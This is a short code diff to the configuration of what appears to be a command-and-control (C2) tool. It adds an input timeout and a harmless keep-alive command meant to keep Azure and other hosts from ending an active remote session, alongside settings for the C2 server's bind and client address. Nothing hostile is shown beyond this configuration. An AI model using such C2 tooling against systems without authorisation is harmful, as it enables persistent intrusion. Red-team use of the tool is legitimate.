@@ -20,6 +20,14 @@ RESPONSE_KEY = "index"
 # Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
 BIND_ADDR = ""
 
+# Command input timeout setting in seconds; 225 is about right for Azure; set to NONE if not needed
+# INPUT_TIMEOUT = 3
+INPUT_TIMEOUT = None
+
+# Run this command automatically to prevent Azure and other hosting environments from killing our active session
+# KEEP_ALIVE_CMD = "time /T" # Windows only
+KEEP_ALIVE_CMD = "date +%R" # Linux only
+
 # -----------------------  Begin client code only variables  ------------------------
 
 # Set the c2 server's IP address or hostname
